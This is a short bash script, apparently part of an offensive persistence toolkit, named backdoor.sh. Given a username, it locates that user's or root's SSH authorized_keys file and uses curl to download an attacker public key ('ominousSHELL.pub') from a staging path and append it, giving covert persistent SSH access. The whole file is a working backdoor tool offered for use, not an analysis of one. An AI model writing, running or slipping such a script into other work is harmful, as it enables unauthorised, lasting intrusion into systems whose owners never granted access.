#!/bin/bash

#COLORS
blue="\033[01;34m"
green="\033[01;32m"
red="\033[01;31m"

#Usage
if [[ $1 == '' ]];then
	echo 'Usage: ./backdoor.sh [USER]' 
	exit
else
	user=$1
fi

public_key_authentication(){
	if [[ $user == "root" ]];then
		file_path="/root/.ssh/authorized_keys"
		path="/root/.ssh/"
	else
		file_path="/home/$user/.ssh/authorized_keys"
		path="/home/$user/.ssh/"
	fi

	printf "$blue[+] Attempting to set SSH backdoor [PUBLIC KEY AUTHENTICATION]...\n"
	if [[ -w "$path" ]];then
		if [[ -w "$file_path" ]];then
			curl -sS http://127.0.0.1/persistence/ssh/ominousSHELL.pub >> $file_path
			if [[ $? == 0 ]];then
					printf "$green[+] Done\n"
					printf "$green[+] File: $file_path\n"
			else
					printf "$red[-] Error occured.\n" 
			fi
		else
			printf "$red[-] Error: File \"$file_path\" doesn't exist or is not writable.\n"
		fi
	else
		printf "$red[-] Error: Directory \"$path\" doesn't exists or is not writable.\n"

	fi
}

public_key_authentication
